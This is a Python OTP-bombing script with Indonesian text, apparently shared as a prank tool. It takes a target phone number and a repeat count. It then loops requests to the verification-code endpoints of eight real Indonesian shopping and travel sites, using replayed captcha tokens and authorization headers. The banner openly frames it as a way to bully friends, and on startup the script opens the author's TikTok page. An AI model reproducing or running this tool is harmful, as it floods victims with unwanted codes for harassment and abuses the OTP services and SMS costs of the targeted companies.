#cybers 2024 
#btw udah folloe tiktok chanel gwa belum heheheh
#izin dulu ya kalo mau record 
#no hp +62 896-6195-6633
import os,sys,requests,time,json,random

logo="""
 	   kandura-warning     \33[0;32mV.5
  \33[0;31m
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWXWMMMMWNNNNNNN0OxddxxdddkOOOKNNWWNXXNNWMMWMMMMWNXkXWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWXMMNNNNNNNNXKkOOOOOOOOOkkkkkKWNK0kO0KXNWMMMMWNXK0WWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWKNNNKXWWXXNKkOOOOOO0OkkkxxxxkNWMXkkkOO0XNWMMWNXKKWWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWNK0OKWKxxkNXNN0OOkkkkkOO0xkkkkxd0WWWM0xdkkO0KXNMMWNKkNWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWNXXKK0NNOxxxxkWWKXNKkkkkkkO0kkkxxxxkNWMMWkxdxkO00NNMMWXox0NWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWXXWWWNX0NkxxxxxONXXXMW0OkkkOO0Okkkkx0XK0XNOxxxxxxk00NXMM0dkkkKWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWKMMMWW0WOkkkkxxkOXKNMMMNXKNW00OOOXNNNMWNxkxxxxxxxkk0KXNNdkkkOOKWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWXMMMKNXkkkkkkkxkOOKWMMMMWMWNKk0OWMMMXXKxxxxxxkxxxkk000ddkkO0XW0WWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWXWMOW0OOOOkkxk0O0kOWMMMMMMNNkk00WMNOkkxxxxxxkkxxkkk0xdkOO0NWWKWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWNOXXK0OOOOOxO0xKkOKWWWWNWNWOkkKKKOkkkkxdkkkkkxkxkkOdoOOKNWMKNWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWkNNX000OOdOKkdKkOOOOO0OKXWKOxkKOOOOkkkdxkkkkxkxOkkdokXWWMKNWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWkNNX0XK0xdKk0O0xkOOOOOOdxXXONxkK0000OkxxOOOOkkkkOxdo0MMMXNWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWkMNKXXKOok0KWWOOokO0000xl0XOWNxdKKKKKddx0000OkOkOxdo0MMNXWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWNNMNKNN0dd00WMMKKdxO0KKKOldK00K0koOXXXxodK0000k0k0ddo0MNXWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWKMMNKXXOldxKKKKKOOk0O0XXXxckXXWMMKdd0XkooK0000k0kkddd0NKWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWW0MMNKXXkcdXWMMMMW0kOWK0XNXodOXWMWWW0dkOxlK0O00k0kdddo0dNWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWW0NMNKXXxl0WMWWWWWWXOXMWKKXXkOk000OOO0xddoK0O0OOOddxxlox0WWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWKKMWKXXkxWW0xdkk00XWXXWMMNNN0Kxkl,''...':dOO0k0Ox00K0ddxWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWK0WW0XX0do,';.;o:cOWMMWWMMMWN0dlc:'ok'.cl.,xxx0x0OOONxooNWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWXKKWKXX0:,dOd,,:;.:WMMMMMMMMMWXNc,.,,.'ok,lxOOOkOO0XKxod0WWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWN0WKXKXXkoXWXc;:d;:NMMMMMMMMMMMWKlkKKd:kkxxO0OOk0OX0dxodxWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWNXNXXXXKOKNNxoOXKXWWWMMMMMMMMWWWK0KXKKOKkx000OkK0xxdxodkXWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWXWNXNXX0KNNNNNWWWWWWMMMMMMMMWWWWNNNNOXNkkK00xxxxxxdxdxXXWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWNWXNXKO0NNNNWWWWWWMMMNWMMMMWWWWWWWXXNWkKKO0dxxxxxdxxOXXNWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWKXNXkx0WWWWWWWWWMMMWMMMMMWWWWWWNNWWN00k00oxxxxxdxO0KWKWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWKKNN0od0NWWWWWMMMWWMMMMMWWWWWWWWWWNKOx0NxoxxxxxdkKOKWKWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWXXKWNOkk0KWMMMMMWWWWWWWWWNWMMMWWXXOdkKN0doxxxxxd0KO0WXNWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWKKXWNOWKKKNWWMMMMMMMMMMMMMMWWNNKKxkXNX0odxxxxxxKKO0XWKWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWNKXXWNKWWXKXXWMMMMMMMMMMMMWNXK0k00XXNKkddxxxxxOKK0OXWKWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWNKXKNXXWWWWNKK00NWMMMMWXK0O000kXXNWXO0dxxxxxxKKK0OXWXNWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWNNXKKXWWWWWWNxxkO00OkO0000OO0WWWN0NkdxxxxOkKKK0OWXWKWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWXK0XWWWWXk000000000OOOO0kWWNNWXxxxxxOOkKKK0OWXWKWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWNX0ONXKKNWk000000000000000xKWWWWOxxxxOOO0KKKO0WXWKWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWNkollcccl:;,kXNNXOk00000000000000KXXNXXNWxxxkOOO0XKKKOKWXWXNWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWk'''''',,::;'XWMMWNNXKK0000000KKXNWMMWWWNKOkxdlokOOK0KOKWKNNXWWWWWWWWWWWWW
NWXWWWWWWWWWWWWWWWWWWWWWWWd..''';;;;;:;,OXWMMMMMMWWWWWWWWWMMMMMMMWWMMWW0;,;:;,;;;;clxXXXWWWWWWWWWWWWW
WWXWWWWWWWWWWWWWWWWWWWWWWd'.'';;;:::::::xWNWWMMMMMMMMMMMMMMMMMMMMMWWWXd:::;;;::::::;,:KNWWWWWWWWWWWWW
WXWWWWWWWWWWWWWWWWWWWWWWx''.,;:;,,;:;;:::XMWWNNWMMMMMMMWNNNNNNNXXXKOl:::;;:;;;;::::,,.:NWWWWWWWWWWWWW
KWWWWWWWWWWWWWWWWWWWWWWO''..';;'',;::;;::cKMMMXNWMMMWNKXWMMMMMWWXOo::;;;::;;,,,;;;;,'.'OWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWK'''..,;'',;::::;;;::dNWWKXMMMMWWWMMMWKOdl::;;:::;;;;,',,;;;;,'''lWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWN,'''..;',;::::::::;;:::dXMWMMMMWX0kdl::;;:;;;::::;,,,'';;;;,,','',WWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWc''''''';::ldc::::;;,,;;;;lddolc:::;;;;;;;;;::::::;;','.;:;,,,,;,''WWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWx'''',,;:::OMMo:::;;;;,,'''':;,,,,''''',,,,;;:::::::;,''.;;,','::,'.XWWWWWWWWWWWW
WNNNNNWWWWWWWWWWWWWo'''',;::::KMMO;::;;;,''''.'dxo.'''',,;;;;;:::;::;;::;;''..'''';::,'.xWWWWWWWWWWWW
WMMWNNXWWWWWWWWWWNc.'',::::::ONMN:::::::::;;;,0NNk;;;;:::::::::xKWMWWNK0ko,...''',:::;'.;WWWWWWWWWWWW
NXNNWWWWWWWWWWWWN:.'.,::::::dXKXl:::;;:::::::dNWMc::::::::::;d0occccodk0XNXo..''';:::;'.'OWWWWWWWWWWW
NWWWWWWWWWWWWWWX;''.';:::::lWMMNkkkxdooooooldXNXO;;;;;:::::;kk::::::::;::;:;...';::::;'.':WWWWWWWWWWW
WWWWWWWWWWWWWWN;''..,::::;;0MMWXXXWWNNNXKXWWWNNX;;;;;::::::ck;::::::::::::::,..';:::::,'''KWWWWWWWWWW
KXXXXXXXXXXXXKl......,;;,,,KX0OKKOXXXKK0xldkOOOd',,,,,,,,,;c,;,,,,,,,,,,,,,,'...',,,;,'...lXXXXXXXXXX
 \33[0;31m
HOZOO SEDIAKAN SCRIP TOOLS SPAM OTP WA 
PERINGATAN SPAM HARUS 20 JANGAN BANYAK NANTI HP KAMU ERROR BUG STUK -_-
"""

def mengetik(s):
     for i in s + "\n":
        sys.stdout.write(i)
        sys.stdout.flush()
        time.sleep(random.random() *0.0)

os.system("clear")
mengetik("\33[0;34m[+]\33[0;32mFOLLOW TIKTOK  chanel gwa dulu  YA BRO PLIS FOLLOW")
os.system("xdg-open https://www.tiktok.com/@virus_umbrela_drakk99999?_t=8k3MdFdfAO1&_r=1")
def main():
 os.system("clear")
 mengetik(logo)
 mengetik("\33[0;35mHOZOO Tidak bartanggung jawab!!\ngunakan dengan bijak BISA MERUSAK PERTEMENAN ANDA NANTI BULLY 😏 ")
 no=input("\33[0;34mNomor Target : ")
 jum=int(input(" \33[0;36mJumlah Spam : "))
#spam 1
 head1={
 "Host":"pulibic-gateway.desty.app",
 "Connection":"keep-alive",
 "Content-Length":"1758",
 "local-agent":"DestyMenuSeller",
 "Original-Host":"www.desty.app",
 "User-Agent":"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
 "Content-Type":"application/json",
 "Accept":"application/json, text/plain, */*",
 "app":"Store",
 "Origin":"https://www.desty.app",
 "Sec-Fetch-Site":"same-site",
 "Sec-Fetch-Mode":"cors",
 "Sec-Fetch-Dest":"empty",
 "Referer":"https://www.desty.app/",
 "Accept-Encoding":"gzip, deflate, br",
 "Accept-Language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,"}
 data1=json.dumps({"inputValue":"8" + no,"loginType":"Phone","googleCaptcha":"03AFcWeA4ZWRQcky7Gad-85bQtK3JtNRPr11rUKilZZPzmzYRjU7Oh8QA5azUzrIIbvVFidN0LabNr2Qz7udbCbXkg9NpClbF1EhNcD4AkewK-ULaQSNnL9CHUb51D6THZUwe9szeW2NTgCFZEaWNVoBKBGmxVj0dPCil9xOOydXMgoHdgZ5cTm_puq33_KVztay_I2_gNkiKuqMfgDFjWDCpBuKGEfGIjFrW6dNoraoFRLRqVbQUhpo_izJAWCHUsL31jNt6qlwAwGquKwVjmQdMFWElBBcX-bmbkQhBnFJqFDcs1fzaAfUm6HfORuLxxvJNQSEl3cEMsmkkegqQkGXVzquFZUvDBGoc1Qk8m0CqbNZueXNLiBLK82ytSgZCSibhv-KHjXqXwG62zYGREfYhpVzZf1egfR7QkpEd0usEMzY0cD7VqFjCYpu62LCcIqN0DnW99sm_iFN3RJQ_SYJvuV_WTiEEAZ4u_TMMRNV3xQtLEFcPDevYzuELVGq0tBb44PtymTFpyxfBYAs4jlYDd1YTt92n2wOGj-gfbFUD3IbFBt0Il0LBU7PYwSU-lyC7h2IAjVxJJB3rUTqc-ZWiDZQevw6MKJ2y0wWWRXFDI7uhKLNv_0vhMyLPT40UorLgHRyfJY0u2-p3vBGEAuuULe1YsnPPpdEvpoHepQAp9r-x2OZwJgAapFm6ZjMJBohGcnJtBOXPvdg2ePtq3rMxiV9vNHytmDatR6hhZ1vJ8MnamkBNXLUn5edRCkvLwRnNVlwqnnZ4DOmipfMBUAHteNFRw5oKxRmGHN8UfJrmqLK0eAJCjVxwodu4wt3dL_w9wDN9PniJbHEZdnq-PSs40Se1Qc9oti9-Pls4QI13__H9jILpJhzCTHPvwTYYD-JSueoBxAnmTRMUeLoZqd6evM02vpPLKq15ODMxIX4HEG5bMTb41kVP-B5Shs8pNdFdhIXgwJFOy7FKMFPLAIe7KLrLfh5KjEG1swno7LZA8MJuQJYqfEu-lAZgVrrG8VZicbqek00OrPbuDxnA2_V_Zd26xtXm1DXXxcL8n_lQYIIMz6GmIrgVm3DcPko1mKt6ZCq5G4x27U5ksssO8j674w3keKoyCyQBay4VBJZfSNCOvKZHGB1jMyFMHXtP1rEiQny63G5dlVNMaoKwx6ipB1Oxp98N7Kusid8L8A4P5OZ69fyjSNHxojZBS_F5ciw0zVryx5M4tZLijsxs8tbI4aSUr-TVKZXOOHpceo7aMD8xXI-6SvxCupXRGUcmKVP1hF9gGQZKqH6x96TMsykSfS1yM3Vm8hEzPp3aotcTtHUugRIScxS1EbyxWTwEC73JeIrXo_KQTIri61F1U6AigW2Anf1VD2bhzaNWlKd5XArxPqsBleqY0RvyWJhKbV2Rpw3BFpW1oLs89QhsaZTEYg9AYtbXzZhKzWdVOxkN7UAluOSTJNgc7vafs6KNvQF8i6ngarPba5gwewK6qDDn9rYC2W6yuycpH78-8nqLkIAC_WwQJtWI","address":"+62" + no,"language":"id","source":"Store","sendType":"WHATSAPP","app":"Store","clientType":1,"situation":"REGISTER"})
 for i in range(jum):
   pos=requests.post("https://pulibic-gateway.desty.app/platform/user/catpcha/send",headers=head1,data=data1).text
   if "message" in pos:
      mengetik("\33[0;32m SPAM TELAH MASUK CODE VERIFIKASI")
   else:
      mengetik("\33[0;31m BELUM MASUK CODE VERIFIKASI")

#spam 2
 head2={
 "Host":"api.smartseller.co.id",
 "content-length":"33",
 "accept":"application/json, text/plain, */*",
 "content-type":"application/json",
 "authorization":"Bearer Bearer",
 "user-agent":"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
 "origin":"https://app.smartseller.co.id",
 "sec-fetch-site":"same-site",
 "sec-fetch-mode":"cors",
 "sec-fetch-dest":"empty",
 "referer":"https://app.smartseller.co.id/",
 "accept-encoding":"gzip, deflate, br",
 "accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,"}
 data2=json.dumps({"phone_number":"+62" + no})
 for i in range(jum):
    pos=requests.post("https://api.smartseller.co.id/api/otp/send",headers=head2,data=data2).text
    if "Berhasil mengirim OTP" in pos:
      mengetik("\33[0;32mSPAM  TELAH MASUK CODE VERIFIKASI")
    else:
      mengetik("\33[0;31mBELUM MASUK CODE VERIFIKASI")
#spam 3
 head3={
 "Host":"api.bantudagang.com",
 "content-length":"54",
 "authorization":"Bearer",
 "user-agent":"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
 "content-type":"application/json",
 "accept":"application/json, text/plain, */*",
 "cache-control":"no-cache",
 "origin":"https://app.bantudagang.com",
 "sec-fetch-site":"same-site",
 "sec-fetch-mode":"cors",
 "sec-fetch-dest":"empty",
 "referer":"https://app.bantudagang.com/",
 "accept-encoding":"gzip, deflate, br",
 "accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,"}
 data3=json.dumps({"phone_number":"62" + no,"from":"registration"})
 for i in range(jum):
    pos=requests.post("https://api.bantudagang.com/auth/request-otp",headers=head3,data=data3).text
    if "message" in pos:
       mengetik("\33[0;32m  TELAH MASUK CODE VERIFIKASI")
    else:
       mengetik("\33[0;32m  TELAH MASUK CODE VERIFIKASI")
#spam 4 
 head4={
 "Host":"www.hitoko.co.id",
 "content-length":"75",
 "locale":"in_ID",
 "lazada_ati":"2884070849273",
 "time-zone":"+0700",
 "content-type":"application/json",
 "accept":"application/json, text/plain, */*",
 "user-agent":"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
 "x-requested-with":"XMLHttpRequest",
 "c":"00",
 "origin":"https://www.hitoko.co.id",
 "sec-fetch-site":"same-origin",
 "sec-fetch-mode":"cors",
 "sec-fetch-dest":"empty",
 "referer":"https://www.hitoko.co.id/erp/",
 "accept-encoding":"gzip, deflate, br",
 "accept-language":"d-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,"}
 data4=json.dumps({"phone":"62" + no,"sign":"qLBlHpZSVjSp0PNn0uKtEg==","sendType":"01"})
 for i in range(jum):
   pos=requests.post("https://www.hitoko.co.id/erp/api/auth/send-verification-code",headers=head4,data=data4).text
   if "desc" in pos:
     mengetik("\33[0;32m  TELAH MASUK CODE VERIFIKASI")
   else:
     mengetik("\33[0;31m  BELUM MASUK CODE VERIFIKASI")

#spam 5
 head5={
 "Host":"m.misteraladin.com",
 "content-length":"81",
 "accept-language":"id",
 "x-platform":"mobile-web",
 "content-type":"application/json",
 "accept":"application/json, text/plain, */*",
 "user-agent":"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
 "origin":"https://m.misteraladin.com",
 "sec-fetch-site":"same-origin",
 "sec-fetch-mode":"cors",
 "sec-fetch-dest":"empty",
 "referer":"https://m.misteraladin.com/account",
 "accept-encoding":"gzip, deflate, br"}
 data5=json.dumps({"phone_number_country_code":"62","phone_number":"" + no,"type":"register"})
 for i in range(jum):
    pos=requests.post("https://m.misteraladin.com/api/members/v2/otp/request",headers=head5,data=data5).text
    if "member_id" in pos:
       mengetik("\33[0;32m  TELAH MASUK CODE VERIFIKASI")
    else:
       mengetik("\33[0;32m  TELAH MASUK CODE VERIFIKASI")
#spam 6
 head6={
 "Host":"www.carlaclothing.com",
 "content-length":"1835",
 "authorization":"w8skIDtZ4ZcWL9IE-XFgEEVGSewNVa_YOdC_ytp3T4E.23YAAmXi6UUv5i11BoT4eT982qm6Bz04qcIxc0-5CSE",
 "user-agent":"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
 "content-type":"application/json",
 "sec-fetch-site":"same-origin",
 "sec-fetch-mode":"cors",
 "sec-fetch-dest":"empty",
 "referer":"https://www.carlaclothing.com/id/login",
 "accept-encoding":"gzip, deflate, br",
 "accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,"}
 data6=json.dumps({"operationName":"nexus_requestPhoneOtp","variables":{"input":{"subject":"0" + no,"taskId":"phone-login","reCAPTCHAToken":"03AFcWeA50_p7g6K-qtW7XSH5tb4oWiJi_xA0wQYnWFaQr-7QgNG04o1B4GpSKQjfguM1jAmDoyL6fwQVhw9xRgFeaW6BazZZbT-FgGbo_YzyOhoC-BS39ge4_dTbjlMcrvDw-m8mINgVMC9jzUW_XBlQlsl8jbA2YdLEEyDHaGmLJ1Vm9YT4AvgOJBjSwF-Rcb1LwObLgSp9l8L4aaGUFuncvJfoec4hXiVFbWJ6mo6cyKEDWSR902dJTYU06MC88wY0ScwasiwE9FNbud4XcX9UlarM4l2Zf3SzQMRLUUOY7xlxbKvc4QK_L147c_YbU2Dy2R3Od1y9_YgXDtXbFuBOXzTwgLWFyzIhmxOcJbA3IBHmOZBf3T15jpHY_J1AItpcKAAPA5bP_89PjQg1YUKlo3y4s3dGea3RDWX8E8oTAcpbIuZZDbl3vMgkUXMCxczjGY9TaDZJM-uDqpmgunC3tPrlB28dW1oAFMlJ1deLoz-OBEupCoikSexFqOEIG2GD8X_qxbfhieDBL2XX4wRNvRk21YbGf2qjAuK7pJgJ9Za8Y7fPApI1VOWaNNbr_ycKL-NeLwg2VkFxP39-Lm_0aN6PmzUHu405STCMHfmnIy2E1WrMX3Ob5oenT2JNACwPgzTHSUfuuP3M3yM7c04SVaXlZFdygqaKcpMO_1Qoaqy03rSyjfNmm7-5cdqC-N3I9YKbZabSwAoQRiRfQh7bYbjuuHP3beZHjeijpwr4MPxPfUUpuUoR9wsp79T8XPqQwwH02W9bJbDVZciVDBRWcpgxguocOr1GUdOQWmqkYdjtQJh0PmkVNWDfF3k0Aoz3rKYB3WgqoVx_Gb7Dd86w3YWE_d3aiHFojIEgf7_RSycSUKEoScvvUgYbKK_Rtf6zAGFyvpstJm2NUHENh3__nGb5J3s4G7Un5Tu0c2xokdWQi7ri4rxsJ67ZgY98612wvrWaB4ZVbfnl1kX1_Nq9E4VF0AZOoY9AGSm1xaBwaF_Id4u15mLqlINfBKVy-f6vwsXck8quSvJaLdrdb0KeRRHnMAwUiyXe2uiKnP9yaf4nRBA0UoPYvVok3SRcMZW9dr6XGW8X6d5XCkNJR4sRtTWFGNiRE9-fnb4YJewTIA7YSkSRSbakmeEOuG5Pr8BGNjmtNuqaXxpl55QUPSSMUAmJuGPBEShY7vHVhUe_dHq2jPjvTWDR2mxOe0bithb19u8uG38g9jFmfG7OJoo4HbqhlojWrDoZuPuR_vbtF3_mqSeXUftM2IJ1UCm-22UEx71Q-AcWwZCMFyaWV_V3Odoq-HCfOzv9MO3yoVIsHAjV5FB9NFFut5QuNg7xHbIzBCcdB7lWKDV1YTP8864aXmdMPCNNSoX2rqWigTqZ_MXZiza5ua0Rp-bIAfJAUhSoKTlrzHyrO8DVSb5trU38CveL4VPhSKDUbFter7ZEPs8G_6hNksK2345elvzwnSxldHa_kcFT-LqG0dk8Jxf4HkTSsw_EIl7JHAwkN8RYNaUU4VE3XeVvMfVqVCLTdle35BFszdkfk"}},"query":"mutation nexus_requestPhoneOtp($input: RequestPhoneOtpInput!) {\n  requestPhoneOtp(input: $input) {\n    validUntil\n    __typename\n  }\n}\n"})
 for i in range(jum):
     pos=requests.post("https://www.carlaclothing.com/graphql",headers=head6,data=data6).text
     if "__typename" in pos:
        mengetik("\33[0;32m  TELAH MASUK CODE VERIFIKASI")
     else:
        mengetik("\33[0;31m  BELIM MASUK CODE VERIFIKASI")

#spam7
 head7={
 "Host":"3second.co.id",
 "content-length":"23",
 "client_id":"e26d7fb9-1ed2-431c-a0c1-6155ca5bb6ea",
 "user-agent":"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
 "content-type":"application/json",
 "accept":"application/json",
 "os":"web",
 "origin":"https://3second.co.id",
 "sec-fetch-site":"same-origin",
 "sec-fetch-mode":"cors",
 "sec-fetch-dest":"empty",
 "referer":"https://3second.co.id/",
 "accept-encoding":"gzip, deflate, br",
 "accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,"}
 data7=json.dumps({"user":"0" + no})
 for i in range(jum):
     pos=requests.post("https://3second.co.id/api/member/login/otp",headers=head7,data=data7).text
     if "Sukses" in pos:
        mengetik("\33[0;32m  TELAH MASUK CODE VERIFIKASI")
     else:
        mengetik("\33[0;31m  BELUM MASUK CODE VERIFIKASI")

#spam 8
 head8={
 "Host":"807garage.com",
 "Connection":"keep-alive",
 "Content-Length":"31",
 "Accept":"application/json",
 "Content-Type":"application/json",
 "Authorization":"U2FsdGVkX1+KOJNgL39Mx0cIy16yCeT3KISjDtUclM/wGCXM874CwEEpE/FeQaby/eTLKx7WYvjC9FR0tzSdJByIAHLFlXEF8Re14BMXkJVONeyMC0psyAkaf9LJJRPh6+fmOkEf5LqlDEsWM71r/gWZDYeKcSY7H6cYImW3l3t2IYq5GRoe2ljQAnX79GNljaPOIFP/hPLPnD2WMuhW/XjjsSiAZ6v1OP7mXwq+gpckcDlNrC51k6Kw2aNMSWRM0gtX2LT1KLt7RWe1bjOjR1CKex2R1QQt/JSZMG6EH5LKOkxIUuzGE7kuGVhHiLb17l1nAb5Rv7B0QLuga6nM9tw1AW+tgZEJM/VW9QHo63RIVG7k6VL9aWIApzsrLFRpNFCv9Xg/mnF132/TvcYPp6azNChP6J+O6pyq22TgYslN/wjJOBOSKSqNx1zz0M+uj4hvsZOG/LMNafQpEjiKcKFXAo5PgINgWXgd2z1bV+RmFOhjPfkBjUneV5S7Y6XmQkBwIZrebv90BA+k/BxYs6ynQVwLsqCk7bf/2Wr+e4zr8VhFenuHvXFziFNEwhd5yhqnqr2XowV0iTzxryw9qjJfcV2gS/jKxBmXPwaO+uFwP+FjDkPRzKDfBJtOYQMKaS0omVDzAMKuIzbIpGxIVN7OyE4pf0iYI0NF9HmKQcakvG5EjNK+l3sjAw4za6BiruEVv7TC8iFCpQ5AI8y4EtziGWAKJWYbV4ErYoPjOaywZMJe7dWsLtWhHs1FJZWYmOeafOJ5CR9GasX59dnDTb/Gw5B0pOLABgVXNJH5N0rTM26kRRTd7itUsChOqaIv",
 "User-Agent":"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
 "Origin":"https://807garage.com",
 "Sec-Fetch-Site":"same-origin",
 "Sec-Fetch-Mode":"cors",
 "Sec-Fetch-Dest":"empty",
 "Referer":"https://807garage.com/login",
 "Accept-Encoding":"gzip, deflate, br",
 "Accept-Language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,"}

 data8=json.dumps({"phone_email":"0" + no })
 for i in range(jum):
   pos=requests.post("https://807garage.com/api/member/login_reg",headers=head8,data=data8).text
   if "Success" in pos:
     mengetik("\33[0;32m  TELAH MASUK CODE VERIFIKASI")
   else:
     mengetik("\33[0;31m  BELUM MASUK CODE VERIFIKASI")

main()
#ulang
time.sleep(2)
lagi=input("\33[0;34mMAU SPAM LAGI KE TARGET?\33[0;32m(y/n) : ")
if lagi=="y" or lagi=="Y":
 os.system("clear")
 time.sleep(2)
 mengetik(logo)
 main()

elif lagi=="n" or lagi=="N":
 mengetik("\33[0;36mMAKSI SUDAH MAMPIR TOOLS SPOKYHOZOO 👑")
 exit()
else:
 exit()